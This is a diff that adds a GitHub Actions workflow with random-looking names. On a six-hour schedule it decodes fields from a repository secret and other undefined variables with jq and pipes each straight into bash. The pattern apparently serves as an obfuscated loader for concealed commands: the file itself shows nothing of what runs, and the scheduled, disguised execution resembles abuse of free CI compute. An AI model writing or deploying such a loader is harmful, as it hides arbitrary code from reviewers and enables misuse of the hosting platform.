@@ -1,0 +1,30 @@
+name: zhouheiyi6547
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhouheiyi6547
+        env:
+          eh8: ${{ secrets.eh8 }}
+        run: |
+          echo $eh8 | jq -r .ok58 | /bin/bash
+          echo $sr416 | jq -r .rha56 | /bin/bash
+          echo $g46 | jq -r .bqd4 | /bin/bash
+          echo $gvc48 | jq -r .fqn03 | /bin/bash
+          echo $var26 | jq -r .xcrb97 | /bin/bash
+          echo $o94704 | jq -r .cdumw9131 | /bin/bash
+          echo $obmrn9324 | jq -r .ll612 | /bin/bash
+          echo $bpvex460 | jq -r .x303 | /bin/bash
+          echo $raxr0 | jq -r .izhf6726 | /bin/bash
+          echo $ronm01332 | jq -r .id9 | /bin/bash
+          echo $kvmzs45950 | jq -r .ua45614 | /bin/bash
+          echo $gfq8 | jq -r .rb34118 | /bin/bash
+          echo $qxtq740 | jq -r .dy70 | /bin/bash
+
